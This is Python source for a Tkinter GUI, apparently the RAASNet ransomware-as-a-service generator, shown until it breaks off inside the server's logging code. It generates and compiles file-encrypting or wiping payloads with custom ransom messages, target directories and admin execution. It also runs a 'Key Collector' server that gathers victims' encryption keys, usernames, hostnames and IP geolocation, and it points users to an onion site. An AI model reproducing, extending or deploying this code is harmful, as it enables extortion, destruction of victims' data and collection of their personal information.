dFwZ8j7y4eAB5mgwSi59u1BeXhk1bP6u1G/TG9lglch3oXTzkRcH/8skEWbptTLkfeQEQ4yD1Tp2
oXz7zPjIbRwsU8xdgo14H3l2kNFJc8IutUewEe8jlwqC8VUoQCS6UP7q5iNHMIw5lgA5sV0oHXzk
BI4xeRdg6xNs9JPxkRtMc3nYFfIErgulg48cPPSQ8hywzcp1oXTwkStoho8lwM4EG3XwkSOMk6c3
kWEcZmX4834fOWU46PTjmWGek+9CudFH3lzUGPFssE/gg41u85EDHJAmmgQHND7Y6DYfucIBp499
Ds9xZ7DRp1ceyN151+U1kSS4IJf7VoaUj1wyXND4PaEPFqYL5UYf+YQTdh9Xv3jSXcFGPxgfOcAL
+ZoIrgwvNGZleJuPvMINK5NBusIP8z1dKF9+ERDhv6V+40dYLqjljmCjb0wVU8nwxMlPGlwQmZXh
LT7yAl+cns8Vr/zxwUZcFVNjfCT/71llhTc2pgvlBh+5wR01TH8gVPgjPB5sRK4Mf1PFdH6slvpY
pt9QIjxS6WCjJ/jI6YO11Ndj+iVHhU/i+64MvzA+8gKv1IM7Vg7IhehCeV8fOcEx+ZynfzCfGY45
mWCjd/WRG5zT4hzK9D9KmGPLcE7gVoa8j7w+NmqYMXDF+oQuFMJHvmxeqecZHO8VbPTC+MgRg4/y
/s4HG73dR04YuGMhulB+vJOPvGHgj4tbGb7dR6683jcwTCOCjb68i49cMfDI/NQuFN5Hjhi4pBZ+
ZfhEHzllDHwSn9iFwvvIGwZeSU/rQuF95ICBWxq/MmSrmA4HF3NoBuFJXSi8j7xj4Jj6zC6U74SP
XDIGnol8sNFTfOQTBAM/V3YuJtiI95EDBs45n9WFQlUxrRh4J7DBRk/wkQ+4Z7D+t70721IUiME4
jluwccAWmlJ23/8lZ6XsLdCZ0ln9/669zDmUlXypwLdQDNHn/T2f3HEKfAslfB65KHEHXHWDxUZr
5QvX3U2kHqoi/C2UoHnkocR96Oxvoeyun0duStAytC026rV5ZE7uaK57C0WfR2a8D666arHRTh8P
DAjmgJahYR6Zkzseg99CmZlHJlKPIXyx0afpeWQi9diHtgzn5pE5uaMOfQuln5tH5uSOLHCx0WZu
HplgDpzt/P72ymE7H31mvA9H+2KjTXSx1n9CpB4XqX2x0TYaHabmmDm5w3syXTkMr/4Y7tQxZiL1
MPSNO2UW4uFFl7CyTeFU6Z1CZ18/c/ZHd8O+UcA6/u6P76v3Z3InCsA08eejYPH7L+UggFH9vnTO
lwhFZrhoBQw35pWI5Jf+8xBYWECmfAsTHyZ0gYUFZEosf+FvscrAwgIyZRJiOfZz0msLCxSW54Ng
WmG1AgQWVjp2dbTVfLUARoNSWPlYWJlpfB5QqE3FqcLKBDBplNqZLixXCWAxTBVWrAa6CgEM9vp8
jf6vUJ/0A/QsoH54X+vJG9cJYGkUqtcNekuHyoJJW46UC9Lt1DYGl8oMoDqWntLSOUw/XlJUAkxJ
69LTmtBRPB1vdk0lgOaxndnzkFxCOk+lzhWdvAXsj3NrHnK/aWZ2qWjdnlIBvK5p3WxKzEdWN4aE
sxu+yu4bimEY6o/3Svq9fkv2IAeDtpZb2WsbCFC2+i1vkZ4H3NunTzasFr0BNG83Jy94buJ6aOXd
rsgzlXUb1NUuemVNZd0CdZUn0StJLt90rgwBnER/Wi7JlYa1DVB38k18iN5JcqVnbQFkla8rRbLz
uYu6tAPaMS2YHyJdL6O0LU0AV/gQ6iqJphxyGVXN0ZXAvLrdyyjuoznbWC66UzuUOmAomk4uVg/R
vGQZyytpmmbAS/s0lVfWi+hjyTYXO2C3iIwO541YAHmfRD/joV9RXJi32W2TKECy6Jfr9ToW4KV4
vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')

        self.bind("<Escape>", self.exit_event) # Press ESC to quit app

        if platform.system() == 'Linux':
            photo = Image.open(resource_path('images/logo2.png'))
            resized = photo.resize((150,150), Image.ANTIALIAS)
            photo = ImageTk.PhotoImage(resized)
        else:
            photo = PIL.Image.open(resource_path('images/logo2.png'))
            resized = photo.resize((150,150), PIL.Image.ANTIALIAS)
            photo = PIL.ImageTk.PhotoImage(resized)

        label = Label(self, image=photo, background = 'white')
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0)

        Label(self, text = 'RAASNet Generator', background = 'white', foreground = 'red', font='Helvetica 32 bold').grid(row = 1, column = 0)

        # Buttons
        start_server = HoverButton(self, text = "START SERVER", command = self.open_server, width = 53).grid(row = 2, column = 0)
        decrypt = HoverButton(self, text = "DECRYPT FILES", command = self.decrypt_files, width = 53).grid(row = 3, column = 0)

        generate_demon = HoverButton(self, text = "GENERATE PAYLOAD", command = self.generate, width = 53).grid(row = 4, column = 0)
        compile = HoverButton(self, text = "COMPILE PAYLOAD", command = self.compile, width = 53).grid(row = 5, column = 0)


        profile = HoverButton(self, text = "PROFILE", command = self.profile, width = 53)
        profile.grid(row = 6, column = 0)

        exit = HoverButton(self, text = "EXIT", command = self.exit, width = 53).grid(row = 7, column = 0)

    def profile(self):

        self.prof = Toplevel()
        self.prof.title(string = 'Profile')
        self.prof.configure(background = 'white')
        self.prof.resizable(0,0)

        self.bind("<Escape>", self.close_profile) # Press ESC to quit app

        if platform.system() == 'Linux':
            photo = Image.open(resource_path('images/incsec_full.png'))
            resized = photo.resize((350,150), Image.ANTIALIAS)
            photo = ImageTk.PhotoImage(resized)
        else:
            photo = PIL.Image.open(resource_path('images/incsec_full.png'))
            resized = photo.resize((350,150), PIL.Image.ANTIALIAS)
            photo = PIL.ImageTk.PhotoImage(resized)

        label = Label(self.prof, image=photo, background = 'white')
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0, columnspan = 2)

        Label(self.prof, text = 'Username: ', background = 'white').grid(row = 1, column = 0, sticky = 'w')
        Label(self.prof, text = self.options['username'].get(), background = 'white').grid(row = 1, column = 1, sticky = 'w')

        Label(self.prof, text = 'Email: ', background = 'white').grid(row = 2, column = 0, sticky = 'w')
        Label(self.prof, text = self.options['email'].get(), background = 'white').grid(row = 2, column = 1, sticky = 'w')

        Label(self.prof, text = 'Name: ', background = 'white').grid(row = 3, column = 0, sticky = 'w')
        Label(self.prof, text = self.options['name'].get(), background = 'white').grid(row = 3, column = 1, sticky = 'w')

        Label(self.prof, text = 'Surname: ', background = 'white').grid(row = 4, column = 0, sticky = 'w')
        Label(self.prof, text = self.options['surname'].get(), background = 'white').grid(row = 4, column = 1, sticky = 'w')

        Label(self.prof, text = 'Rank: ', background = 'white').grid(row = 5, column = 0, sticky = 'w')
        Label(self.prof, text = self.options['rank'].get(), background = 'white').grid(row = 5, column = 1, sticky = 'w')

        Label(self.prof, text = 'Status: ', background = 'white').grid(row = 6, column = 0, sticky = 'w')
        Label(self.prof, text = self.options['status'].get(), background = 'white').grid(row = 6, column = 1, sticky = 'w')

        delete = HoverButton(self.prof, text = "DELETE PROFILE", command = self.delete_me, width = 53)
        delete.grid(row = 7, column = 0, columnspan = 2)

    def delete_me(self):
        return messagebox.showinfo('Cannot do that', 'Please, visit our onion site with Tor browser and login.\n\nYou can delete your profile under the Profile section there.')

    def exploit_options(self):
        self.exp = Toplevel()
        self.exp.title(string = 'Exploit Options')
        self.exp.configure(background = 'white')
        self.exp.resizable(0,0)

        self.bind("<Escape>", self.close_exploit) # Press ESC to quit app

        Label(self.exp, text = 'Spoof extention', background = 'white').grid(row = 0, column = 0)

    def open_server(self):
        self.set = Toplevel()
        self.set.title(string = 'Settings')
        self.set.configure(background = 'white')
        self.set.resizable(0,0)

        Label(self.set, text = 'Host', background = 'white').grid(row = 1, column = 0, sticky = 'w')
        host = Entry(self.set, textvariable = self.options['host'], width = 30)
        host.grid(row = 2, column = 0, columnspan = 2)
        host.focus()

        Label(self.set, text = 'port', background = 'white').grid(row = 3, column = 0, sticky = 'w')
        port = Entry(self.set, textvariable = self.options['port'], width = 30)
        port.grid(row = 4, column = 0, columnspan = 2)

        #Checkbutton(self.set, text = "Save keys to Onion Portal account", variable = self.options['save_keys'], onvalue = 1, offvalue = 0).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')

        if host == None or host == '':
            messagebox.showwarning('ERROR', 'Invalid host!')
        elif port == None or port == '':
            messagebox.showwarning('ERROR', 'Invalid port!')
        else:
            self.options['host'] == host
            self.options['port'] == port

        go = HoverButton(self.set, text = 'Ok', command = self.run_server, width = 30)
        go.grid(row = 7, column = 0, columnspan = 2)
        self.set.bind('<Return>', self.set.destroy)
        exit = HoverButton(self.set, text = 'Cancel', command = self.set.destroy, width = 30).grid(row = 8, column = 0, columnspan = 2)

    def run_server(self):
        self.set.destroy()
        self.serv = Toplevel()
        self.serv.title(string = 'Demonware Server - Key Collector')
        self.serv.configure(background = 'white')
        self.serv.resizable(0,0)
        self.serv.protocol("WM_DELETE_WINDOW", self.close_server_by_click)

        self.serv.bind("<Escape>", self.close_server) # Press ESC to close window

        # Input field data is being inserted in this dict
        self.serv.options = {
            'host' : StringVar(),
            'port' : IntVar(),
            'remote' : StringVar(),
            'local' : StringVar(),
            'platform' : StringVar(),
            'key' : StringVar(),
            'mac' : IntVar(),
            'linux' : IntVar(),
            'other' : IntVar(),
        }

        # Canvas for image
        canvas = Canvas(self.serv, highlightthickness=0, height = 150, width = 500, background = 'white')
        canvas.grid(row=0, column=0, columnspan = 4)

        #photo = PIL.ImageTk.PhotoImage(PIL.Image.open(BytesIO(base64.b64decode(photo_code))))
        if platform.system() == 'Linux':
            photo1 = Image.open(resource_path('images/windows.png'))
            resized = photo1.resize((100,100), Image.ANTIALIAS)
            photo1 = ImageTk.PhotoImage(resized)
        else:
            photo1 = PIL.Image.open(resource_path('images/windows.png'))
            resized = photo1.resize((100,100), PIL.Image.ANTIALIAS)
            photo1 = PIL.ImageTk.PhotoImage(resized)

        if platform.system() == 'Linux':
            photo2 = Image.open(resource_path('images/mac.png'))
            resized = photo2.resize((100,100), Image.ANTIALIAS)
            photo2 = ImageTk.PhotoImage(resized)
        else:
            photo2 = PIL.Image.open(resource_path('images/mac.png'))
            resized = photo2.resize((100,100), PIL.Image.ANTIALIAS)
            photo2 = PIL.ImageTk.PhotoImage(resized)

        if platform.system() == 'Linux':
            photo3 = Image.open(resource_path('images/linux.png'))
            resized = photo3.resize((100,100), Image.ANTIALIAS)
            photo3 = ImageTk.PhotoImage(resized)
        else:
            photo3 = PIL.Image.open(resource_path('images/linux.png'))
            resized = photo3.resize((100,100), PIL.Image.ANTIALIAS)
            photo3 = PIL.ImageTk.PhotoImage(resized)

        if platform.system() == 'Linux':
            photo4 = Image.open(resource_path('images/other.png'))
            resized = photo4.resize((100,100), Image.ANTIALIAS)
            photo4 = ImageTk.PhotoImage(resized)
        else:
            photo4 = PIL.Image.open(resource_path('images/other.png'))
            resized = photo4.resize((100,100), PIL.Image.ANTIALIAS)
            photo4 = PIL.ImageTk.PhotoImage(resized)

        label = Label(self.serv, image=photo1, background = 'white')
        label.image = photo1 # keep a reference!
        label.grid(row = 0, column = 0)

        label2 = Label(self.serv, image=photo2, background = 'white')
        label2.image = photo2 # keep a reference!
        label2.grid(row = 0, column = 1)

        label3 = Label(self.serv, image=photo3, background = 'white')
        label3.image = photo3 # keep a reference!
        label3.grid(row = 0, column = 2)

        label4 = Label(self.serv, image=photo4, background = 'white')
        label4.image = photo4 # keep a reference!
        label4.grid(row = 0, column = 3)

        self.serv.options['win'] = Label(self.serv, text = 0, background = 'white', foreground = 'red', font='Helvetica 16 bold')
        self.serv.options['win'].grid(row = 1, column = 0, columnspan = 1)
        self.serv.options['mac'] = Label(self.serv, text = 0, background = 'white', foreground = 'red', font='Helvetica 16 bold')
        self.serv.options['mac'].grid(row = 1, column = 1, columnspan = 1)
        self.serv.options['linux'] = Label(self.serv, text = 0, background = 'white', foreground = 'red', font='Helvetica 16 bold')
        self.serv.options['linux'].grid(row = 1, column = 2, columnspan = 1)
        self.serv.options['other'] = Label(self.serv, text = 0, background = 'white', foreground = 'red', font='Helvetica 16 bold')
        self.serv.options['other'].grid(row = 1, column = 3, columnspan = 1)

        # Log Frame
        result = LabelFrame(self.serv, text = 'Log', relief = GROOVE)
        result.grid(row = 2, column = 0, rowspan = 4, columnspan = 5)
        self.serv.options['log'] = Text(result, foreground="white", background="black", highlightcolor="white", highlightbackground="black", height = 35, width = 120)
        self.serv.options['log'].grid(row = 0, column = 1)

        scroll = Scrollbar(self.serv, command=self.serv.options['log'].yview)
        scroll.grid(row=1, column=5, sticky='nsew')
        self.serv.options['log']['yscrollcommand'] = scroll.set

        # Tags
        self.serv.options['log'].tag_configure('yellow', foreground='yellow')
        self.serv.options['log'].tag_configure('red', foreground='red')
        self.serv.options['log'].tag_configure('deeppink', foreground='deeppink')
        self.serv.options['log'].tag_configure('orange', foreground='orange')
        self.serv.options['log'].tag_configure('green', foreground='green')
        self.serv.options['log'].tag_configure('bold', font='bold')

        #export_csv = set_ico = HoverButton(self.serv, text = "EXPORT DATA TO CSV", command = self.export_data, width = 50).grid(row = 5, column = 0, columnspan = 4)

        self.start_thread()

    def export_data(self):
        pass

    def compile(self):
        self.comp = Toplevel()
        self.comp.title(string = 'Compile')
        self.comp.configure(background = 'white')
        self.comp.resizable(0,0)

        self.comp.bind("<Escape>", self.close_compile) # Press ESC to close window

        if os.path.isfile('./payload.py'):
            self.options['payload_path'].set('./payload.py')

        if os.path.isfile('./decryptor.py'):
            self.options['decryptor_path'].set('./decryptor.py')

        msg = LabelFrame(self.comp, text = 'Message', relief = GROOVE)
        msg.grid(row = 0, column = 0, columnspan = 3, sticky = 'w')
        Label(msg, text = 'You seem to be running %s.\nYou can only compile for the OS you are running this software on.' % platform.system(), background = 'white', font='Helvetica 14').grid(row = 0, column = 0)

        os_frame = LabelFrame(self.comp, text = 'Select OS')
        os_frame.grid(row = 1, column = 0, sticky = 'w')
        win = Radiobutton(os_frame, text = 'Windows', variable = self.options['os'], value = 'windows')
        win.grid(row = 0, column = 0, sticky = 'w')
        mac = Radiobutton(os_frame, text = 'MacOS', variable = self.options['os'], value = 'mac')
        mac.grid(row = 1, column = 0, sticky = 'w')
        lin = Radiobutton(os_frame, text = 'Linux', variable = self.options['os'], value = 'linux')
        lin.grid(row = 2, column = 0, sticky = 'w')

        sett_frame = LabelFrame(self.comp, text = 'Options')
        sett_frame.grid(row = 1, column = 1, columnspan = 2, sticky = 'w')
        Label(sett_frame, text = 'Icon', font='Helvetica 11').grid(row = 0, column = 0, sticky = 'w')
        Entry(sett_frame, textvariable = self.options['icon_path'], width = 50).grid(row = 0, column = 1)
        set_ico = HoverButton(sett_frame, text = "...", command = self.select_icon, width = 3).grid(row = 0, column = 2, sticky = 'e')

        Label(sett_frame, text = 'Payload', font='Helvetica 11').grid(row = 1, column = 0, sticky = 'w')
        Entry(sett_frame, textvariable = self.options['payload_path'], width = 50).grid(row = 1, column = 1)
        set_payload = HoverButton(sett_frame, text = "...", command = self.select_payload, width = 3).grid(row = 1, column = 2, sticky = 'e')

        Label(sett_frame, text = 'Decryptor', font='Helvetica 11').grid(row = 2, column = 0, sticky = 'w')
        Entry(sett_frame, textvariable = self.options['decryptor_path'], width = 50).grid(row = 2, column = 1)
        set_decryptor = HoverButton(sett_frame, text = "...", command = self.select_decryptor, width = 3, height = 0).grid(row = 2, column = 2, sticky = 'e')

        opt_frame = LabelFrame(self.comp, text = 'Finishing')
        opt_frame.grid(row = 2, column = 0, columnspan = 2, sticky='w')
        finish = HoverButton(opt_frame, text = "FINISH", command = self.compile_payload, width = 75, height = 2).grid(row = 0, column = 0)
        close_comp = HoverButton(opt_frame, text = 'Cancel', command = self.comp.destroy, width = 75).grid(row = 1, column = 0)

        if platform.system() == 'Windows':
            self.options['os'].set('windows')
            mac.config(state = DISABLED)
            lin.config(state = DISABLED)
        elif platform.system() == 'Darwin':
            self.options['os'].set('mac')
            win.config(state = DISABLED)
            lin.config(state = DISABLED)
        elif platform.system() == 'Linux':
            self.options['os'].set('linux')
            win.config(state = DISABLED)
            mac.config(state = DISABLED)

    def compile_payload(self):
        icon = False

        try:
            payload = open(self.options['payload_path'].get()).read()
        except FileNotFoundError:
            return messagebox.showerror('ERROR', 'File does not exist, check payload path!')

        if not self.options['icon_path'].get() == '':
            if not os.path.isfile(self.options['icon_path'].get()):
                return messagebox.showwarning('ERROR', 'Icon File Not Found!')
            else:
                icon = True
        if not os.path.isfile(self.options['payload_path'].get()):
            return messagebox.showwarning('ERROR', 'Payload Not Found!')

        try:
            if self.options['os'].get() == 'windows':
                py = 'pyinstaller.exe'
            else:
                py = 'pyinstaller'

            if not 'from tkinter.ttk import' in payload:
                tk = ''
            else:
                tk = '--hidden-import tkinter --hiddenimport tkinter.ttk --hidden-import io'

            if not 'from Crypto import Random' in payload:
                crypto = ''
            else:
                crypto = '--hidden-import pycryptodome'

            if not 'import pyaes' in payload:
                pyaes = ''
            else:
                pyaes = '--hidden-import pyaes'

            if icon == True:
                os.system('%s -F -w -i %s %s %s %s %s' % (py, self.options['icon_path'].get(), tk, crypto, pyaes, self.options['payload_path'].get()))
            else:
                os.system('%s -F -w %s %s %s %s' % (py, tk, crypto, pyaes, self.options['payload_path'].get()))

            if os.path.isfile('./decryptor.py'):
                ask = messagebox.askyesno('Found decryptor!', 'Compile decryptor now?')
                if ask == False:
                    messagebox.showinfo('SUCCESS', 'Payload compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
                    self.comp.destroy()
                elif ask == True:
                    self.compile_decrypt()
            else:
                return messagebox.showinfo('SUCCESS', 'Payload compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')

        except Exception as e:
            messagebox.showwarning('ERROR', 'Failed to compile!\n\n%s' % e)

    def compile_decrypt(self):
        try:
            decrypt = open(self.options['decryptor_path'].get()).read()
        except FileNotFoundError:
            return messagebox.showerror('ERROR', 'File does not exist, check decryptor path!')

        try:
            if self.options['os'].get() == 'windows':
                py = 'pyinstaller.exe'
            else:
                py = 'pyinstaller'

            if not 'from tkinter.ttk import' in decrypt:
                tk = ''
            else:
                tk = '--hidden-import tkinter --hiddenimport tkinter.ttk --hidden-import io'

            if not 'from Crypto import Random' in decrypt:
                crypto = ''
            else:
                crypto = '--hidden-import pycryptodome'

            if not 'import pyaes' in decrypt:
                pyaes = ''
            else:
                pyaes = '--hidden-import pyaes'

            if not 'from pymsgbox':
                pymsg = ''
            else:
                pymsg = '--hidden-import pymsgbox'

            os.system('%s -F -w %s %s %s %s %s' % (py, tk, crypto, pyaes, pymsg, self.options['decryptor_path'].get()))

            messagebox.showinfo('SUCCESS', 'Compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
            self.comp.destroy()

        except Exception as e:
            messagebox.showwarning('ERROR', 'Failed to compile!\n\n%s' % e)

    def select_icon(self):
        self.options['icon_path'].set(askopenfilename(initialdir = "./", title = 'Select Icon...', filetypes = (('Icon Files', '*.ico'), ('All Files', '*.*'))))

    def select_payload(self):
        self.options['payload_path'].set(askopenfilename(initialdir = "./", title = 'Select Payload...', filetypes = (('Python Files', '*.py'), ('All Files', '*.*'))))

    def select_decryptor(self):
        self.options['decryptor_path'].set(askopenfilename(initialdir = "./", title = 'Select Decryptor...', filetypes = (('Python Files', '*.py'), ('All Files', '*.*'))))

    def generate(self):
        self.gen = Toplevel()
        self.gen.title(string = 'Generate Payload')
        self.gen.configure(background = 'white')
        self.gen.resizable(0,0)

        self.gen.bind("<Escape>", self.close_generate) # Press ESC to close window

        mode_frame = LabelFrame(self.gen, text = 'Mode')
        mode_frame.grid(row = 0, column = 0, sticky = 'nw')
        Radiobutton(mode_frame, text = 'GUI', variable = self.options['mode'], value = 1).grid(row = 0, column = 0, sticky = 'w')
        Radiobutton(mode_frame, text = 'Console', variable = self.options['mode'], value = 2, command = self.check_settings).grid(row = 1, column = 0, sticky = 'w')
        Checkbutton(mode_frame, text = "Fullscreen mode", variable = self.options['full_screen_var'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 1, sticky = 'w')

        server_frame = LabelFrame(self.gen, text = 'Remote Server')
        server_frame.grid(row = 0, column = 1, sticky = 'nw')
        Label(server_frame, text = 'Host:').grid(row = 0, column = 0, sticky = 'w')
        Entry(server_frame, textvariable = self.options['host'], width = 20).grid(row = 0, column = 1)
        Label(server_frame, text = 'Port:').grid(row = 1, column = 0, sticky = 'w')
        Entry(server_frame, textvariable = self.options['port'], width = 20).grid(row = 1, column = 1)

        content_frame = LabelFrame(self.gen, text = 'Content')
        content_frame.grid(row = 1, column = 0, sticky = 'nw')
        set_msg = HoverButton(content_frame, text = 'CUSTOM MESSAGE', command = self.set_msg, width = 25).grid(row = 0, column = 0)
        set_img = HoverButton(content_frame, text = 'CUSTOM IMAGE', command = self.set_img, width = 25).grid(row = 1, column = 0)
        set_ext = HoverButton(content_frame, text = 'CUSTOM FILE EXTENTIONS', command = self.set_ext, width = 25).grid(row = 2, column = 0)

        target_frame = LabelFrame(self.gen, text = 'Filesystem')
        target_frame.grid(row = 1, column = 1, sticky = 'nw')
        set_dirs = HoverButton(target_frame, text = 'SET TARGET DIRS', command = self.set_dirs, width = 25).grid(row = 0, column = 0)

        enc_frame = LabelFrame(self.gen, text = 'Encryption Type')
        enc_frame.grid(row = 0, column = 2, sticky = 'nw')
        Radiobutton(enc_frame, text = 'Ghost (Fastest)', variable = self.options['type'], value = 'ghost').grid(row = 0, column = 0, sticky = 'w')
        Radiobutton(enc_frame, text = 'Wiper (Faster)', variable = self.options['type'], value = 'wiper').grid(row = 1, column = 0, sticky = 'w')
        Radiobutton(enc_frame, text = 'PyCrypto (Fast)', variable = self.options['type'], value = 'pycrypto').grid(row = 2, column = 0, sticky = 'w')
        Radiobutton(enc_frame, text = 'PyAES (Slow)', variable = self.options['type'], value = 'pyaes').grid(row = 3, column = 0, sticky = 'w')

        options_frame = LabelFrame(self.gen, text = 'Options')
        options_frame.grid(row = 1, column = 2, sticky = 'nw')
        Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0, sticky = 'w')
        Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0, sticky = 'w')
        Checkbutton(options_frame, text = 'Self-destruct', variable = self.options['remove_payload'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
        Checkbutton(options_frame, text = 'Run as admin (Windows)', variable = self.options['runas'], onvalue = 1, offvalue = 0).grid(row = 3, column = 0, sticky = 'w')

        meth_frame = LabelFrame(self.gen, text = 'Encryption Method')
        meth_frame.grid(row = 2, column = 2, sticky = 'nw')
        Radiobutton(meth_frame, text = 'Override and Rename', variable = self.options['method'], value = 'override').grid(row = 0, column = 0, sticky = 'w')
        Radiobutton(meth_frame, text = 'Copy and Remove', variable = self.options['method'], value = 'copy').grid(row = 1, column = 0, sticky = 'w')

        finish_frame = LabelFrame(self.gen, text = 'Finish')
        finish_frame.grid(row = 2, column = 0, columnspan = 2, sticky = 'w')
        generate = HoverButton(finish_frame, text = "GENERATE", command = self.make_demon, width = 25, height = 2).grid(row = 0, column = 0)
        exit = HoverButton(finish_frame, text = 'Cancel', command = self.gen.destroy, width = 25).grid(row = 1, column = 0)

    def set_img(self):
        try:
            f = base64.b64encode(open(askopenfilename(initialdir = "./", title = 'Select Image...', filetypes = ([('Image Files', '*.png *.jpg')])), 'rb').read()).decode('utf-8')
        except FileNotFoundError:
            return

        self.options['img_base64'].set(f)

    def set_msg(self):
        self.message = Toplevel()
        self.message.title(string = 'Set Custom Message')
        self.message.configure(background = 'white')
        self.message.resizable(0,0)

        self.message.bind("<Escape>", self.close_set_msg)

        self.options['new_msg'] = Text(self.message, height = 25, width = 100)
        self.options['new_msg'].grid(row = 0, column = 0)
        save = HoverButton(self.message, text = 'SAVE', command = self.change_msg, width = 50).grid(row = 1, column = 0)

        self.options['new_msg'].insert(END, self.options['msg'].get())
        self.options['new_msg'].focus()

    def change_msg(self):
        self.options['msg'].set(self.options['new_msg'].get('1.0', END))
        self.message.destroy()

    def set_ext(self):
        self.extentions = Toplevel()
        self.extentions.title(string = 'Set File Extentions')
        self.extentions.configure(background = 'white')
        self.extentions.resizable(0,0)

        self.extentions.bind("<Escape>", self.close_set_target_ext)

        self.options['new_target_ext'] = Text(self.extentions, height = 15, width = 25)
        self.options['new_target_ext'].grid(row = 0, column = 0)

        scrollb = Scrollbar(self.extentions, command=self.options['new_target_ext'].yview)
        scrollb.grid(row=0, column=1, sticky='nsew')
        self.options['new_target_ext']['yscrollcommand'] = scrollb.set

        save = HoverButton(self.extentions, text = 'SAVE', command = self.change_target_ext, width = 15).grid(row = 1, column = 0)

        self.options['new_target_ext'].insert(END, self.options['target_ext'].get())
        self.options['new_target_ext'].focus()

    def change_target_ext(self):
        self.options['target_ext'].set(self.options['new_target_ext'].get('1.0', END))
        self.extentions.destroy()

    def set_dirs(self):
        self.dirs = Toplevel()
        self.dirs.title(string = 'Set Target Directories')
        self.dirs.configure(background = 'white')
        self.dirs.resizable(0,0)

        self.dirs.bind("<Escape>", self.close_set_target_dirs)

        Label(self.dirs, text = 'Working Directory', background = 'white').grid(row = 0, column = 0, sticky = 'w')
        self.options['new_working_dir'] = Entry(self.dirs, width = 30)
        self.options['new_working_dir'].grid(row = 1, column = 0, sticky = 'n')

        Label(self.dirs, text = 'Target Directories', background = 'white').grid(row = 2, column = 0, sticky = 'w')
        self.options['new_target_dirs'] = Text(self.dirs, height = 10, width = 40)
        self.options['new_target_dirs'].grid(row = 3, column = 0)

        save = HoverButton(self.dirs, text = 'SAVE', command = self.change_target_dirs, width = 15).grid(row = 4, column = 0)

        self.options['new_working_dir'].insert(END, self.options['working_dir'].get())
        self.options['new_target_dirs'].insert(END, self.options['target_dirs'].get())
        self.options['new_working_dir'].focus()

    def change_target_dirs(self):
        self.options['working_dir'].set(self.options['new_working_dir'].get())
        self.options['target_dirs'].set(self.options['new_target_dirs'].get('1.0', END))
        self.dirs.destroy()

    def check_settings(self):
        if self.options['mode'].get() == 2:
            self.options['full_screen_var'].set(0)

    def make_demon(self):

        try:
            create_demon(self.options['host'].get(),
                self.options['port'].get(),
                self.options['full_screen_var'].get(),
                self.options['demo'].get(),
                self.options['type'].get(),
                self.options['method'].get(),
                self.options['msg'].get(),
                self.options['img_base64'].get(),
                self.options['mode'].get(),
                self.options['debug'].get(),
                self.options['target_ext'].get(),
                self.options['target_dirs'].get(),
                self.options['remove_payload'].get(),
                self.options['working_dir'].get(),
                self.options['runas'].get())
        except Exception as e:
            messagebox.showwarning('ERROR', 'Failed to generate payload!\n\n%s' % e)
            return
        try:
            create_decrypt(self.options['type'].get())

            messagebox.showinfo('SUCCESS', 'Payload and decryptor were successfully generated!\n\nFiles saved to:\n./payload.py\n./decryptor.py')
        except Exception as e:
            messagebox.showwarning('ERROR', 'Failed to generate decryptor!\n\n%s' % e)

        self.gen.destroy()

    def decrypt_files(self):
        ask = confirm(text='What type of encryption are we dealing with?', buttons=['PyCrypto', 'PyAES', 'Ghost', "I don't know"])
        if ask == "I don't know":
            messagebox.showinfo('Encryption type detection', 'Comming Soon!\n\nIf you really dont know, test it on one file first.')
            return

        if ask == 'Ghost':
            pass
        else:
            key = dec_key()
            key = key.encode('utf-8')
            if key == False:
                return

        p = dec_path()
        if p == False:
            return

        a = messagebox.askokcancel('WARNING', 'This tool will decrypt your files with the given key.\n\nHowever, if your key or method is not correct, your (encrypted) files will return corrupted.\n\n You might want to make a backup!')
        if a == True:
            pass
        else:
            return

        try:
            counter = 0
            for path, subdirs, files in os.walk(p):
                for name in files:
                    if name.endswith(".DEMON"):
                        if ask == 'PyCrypto':
                            decrypt_file(os.path.join(path, name), key)
                            os.remove(os.path.join(path, name))
                            print("[Decrypted] %s" % name)
                            counter+=1
                        elif ask == 'PyAES':
                            print("[Decrypting] %s" % name)
                            decrypt_file_pyaes(os.path.join(path, name), key)
                            os.remove(os.path.join(path, name))
                            counter+=1
                        elif ask == 'Ghost':
                            rename_file(os.path.join(path, name))
                            print("[RENAMED] %s" % name)
                            counter+=1
                    elif name == 'README.txt':
                        os.remove(os.path.join(path, name))
                        print('[DELETED] %s/%s' % (path, name))
                    else:
                        print("[Skipped] %s" % name)
            print("\n[DONE] Decrypted %i files" % counter)

        except KeyboardInterrupt:
            print("\nInterrupted!\n")
            sys.exit(0)
        except Exception as e:
            print("\n[ ERROR ] %s" % e)
            sys.exit(1)

    def start_thread(self):
        # Start server as thread
        thread = threading.Thread(target=self.start_server, daemon = True)
        thread.start()

    def start_server(self):
        host = self.options['host'].get()
        port = self.options['port'].get()
        save_keys = self.options['save_keys'].get()
        socket_list = []

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((host, port))
        self.server_socket.listen(10)

        self.insert_banner()
        self.serv.options['log'].insert('1.0', "Server started on port [%s] [%s]\nWaiting...\n" % (host, int(port)), 'deeppink')

        try:
            while True:
                sockfd, addr = self.server_socket.accept()
                try:
                    while True:
                        data = sockfd.recv(1024)
                        if data:
                            data = data.decode('UTF-8')
                            ip = addr[0]
                            local = data.split('$')[0]
                            system = data.split('$')[1]
                            key = data.split('$')[2].strip()[2:].strip()[:-1]
                            user = data.split('$')[3]
                            hostname = data.split('$')[4]
                            if ip:
                                lookup = self.get_ip_data(ip)
                                con = lookup.split(',')[0]
                                country = lookup.split(',')[1]
                                region = lookup.split(',')[2]
                                city = lookup.split(',')[3]
                                isp = lookup.split(',')[4]
                                zip = lookup.split(',')[5]
                                lat = lookup.split(',')[6]
                                lon = lookup.split(',')[7]

                            result = '''
[Occured]    -> %s %s
[Username]   -> %s
[OS]         -> %s
[Hostname]   -> %s
[Key]        -> %s
[Remote IP]  -> %s
[Local IP]   -> %s
